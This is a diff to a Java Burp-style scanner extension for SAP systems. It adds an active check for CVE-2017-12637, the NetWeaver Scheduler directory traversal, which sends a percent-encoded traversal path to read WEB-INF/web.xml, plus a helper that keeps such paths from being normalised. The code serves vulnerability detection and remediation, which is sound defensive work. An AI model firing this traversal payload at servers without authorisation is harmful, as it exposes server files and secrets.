@@ -30,6 +30,7 @@ public class SapActiveChecks {
         addIfNotNull(issues, checkVisualComposerMetadataUploader(service, http, sapHost));
         addIfNotNull(issues, checkCtcWebServiceWsdl(service, http));
         addIfNotNull(issues, checkSolManEemAdmin(service, http));
+        addIfNotNull(issues, checkSchedulerTraversal(service, http));
         addIfNotNull(issues, checkPublicInfoDisclosure(service, http));
         return issues;
     }
@@ -251,6 +252,44 @@ public class SapActiveChecks {
         return null;
     }
 
+    // CVE-2017-12637: SAP NetWeaver AS Java directory traversal in the Scheduler
+    // (com.sap.engine.heartbeat) component. The finding is confirmed only when the
+    // traversal actually returns the application's WEB-INF/web.xml, so it is fully
+    // content-verified and will not fire on an unrelated host.
+    private AuditIssue checkSchedulerTraversal(HttpService service, Http http) {
+        String rawPath = "/scheduler/ui/js/ffffffffbca41eda/common/"
+                + "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/WEB-INF/web.xml";
+        HttpRequestResponse rr = sendRawPath(http, service, rawPath);
+        if (rr == null || rr.response() == null) {
+            return null;
+        }
+        if (rr.response().statusCode() != 200) {
+            return null;
+        }
+        String body = rr.response().bodyToString();
+        String lower = body.toLowerCase();
+        boolean isWebXml = lower.contains("<web-app") || lower.contains("</web-app>")
+                || (lower.contains("<servlet") && lower.contains("web-app"));
+        if (!isWebXml) {
+            return null;
+        }
+        return AuditIssue.auditIssue(
+                "SAP: NetWeaver AS Java Scheduler Directory Traversal (CVE-2017-12637)",
+                "<p>A directory traversal through the SAP NetWeaver AS Java Scheduler component returned the " +
+                        "application's <code>WEB-INF/web.xml</code> deployment descriptor. CVE-2017-12637 allows an " +
+                        "unauthenticated attacker to read arbitrary files from the server filesystem, including " +
+                        "configuration and secret stores.</p>",
+                "Apply SAP Security Note 2486657 and restrict access to the Scheduler component.",
+                rr.request().url(),
+                AuditIssueSeverity.HIGH,
+                AuditIssueConfidence.FIRM,
+                "<p>CVE-2017-12637 is a directory traversal in the SAP NetWeaver AS Java Scheduler, disclosed in 2017 " +
+                        "with public exploit code.</p>",
+                "Patch and restrict filesystem-exposing components.",
+                AuditIssueSeverity.HIGH,
+                rr);
+    }
+
     private AuditIssue checkPublicInfoDisclosure(HttpService service, Http http) {
         HttpRequestResponse rr = send(http, service, "/sap/public/info");
         if (rr == null || rr.response() == null) {
@@ -341,6 +380,23 @@ public class SapActiveChecks {
             boolean defaultPort = (svc.secure() && port == 443) || (!svc.secure() && port == 80);
             String url = proto + "://" + svc.host() + (defaultPort ? "" : ":" + port) + path;
             return http.sendRequest(HttpRequest.httpRequestFromUrl(url));
+        } catch (Exception e) {
+            api.logging().logToError("[WaSAP] send error: " + e.getMessage());
+            return null;
+        }
+    }
+
+    // Sends a request whose path is set verbatim via withPath(), so a percent
+    // encoded traversal sequence is transmitted literally rather than being
+    // normalised away by URL parsing.
+    private HttpRequestResponse sendRawPath(Http http, HttpService svc, String rawPath) {
+        try {
+            String proto = svc.secure() ? "https" : "http";
+            int port = svc.port();
+            boolean defaultPort = (svc.secure() && port == 443) || (!svc.secure() && port == 80);
+            String base = proto + "://" + svc.host() + (defaultPort ? "" : ":" + port) + "/";
+            HttpRequest req = HttpRequest.httpRequestFromUrl(base).withPath(rawPath);
+            return http.sendRequest(req);
         } catch (Exception e) {
             api.logging().logToError("[WaSAP] send error: " + e.getMessage());
             return null;
